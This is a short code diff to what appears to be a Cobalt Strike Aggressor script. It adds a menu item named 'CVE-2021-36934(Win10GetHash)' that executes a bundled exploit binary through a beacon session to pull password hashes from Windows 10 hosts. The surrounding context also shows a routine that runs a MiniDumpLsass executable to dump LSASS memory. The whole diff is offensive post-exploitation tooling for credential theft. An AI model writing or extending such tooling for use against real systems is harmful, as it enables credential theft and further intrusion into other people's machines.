@@ -327,6 +327,10 @@ sub FakerScreen {
     dbutton_action($dialog,"Exploit");
     dialog_show($dialog);
   }
+  item "CVE-2021-36934(Win10GetHash)"{
+    $binary = script_resource("./modules/HashCat/win10/CVE-2021-36934.exe");
+    bexecute_assembly($1["@"],$binary);
+  }
 }
 sub DumpLsassMemorys{
     $binary = script_resource("./modules/HashCat/MiniDumpLsass.exe");
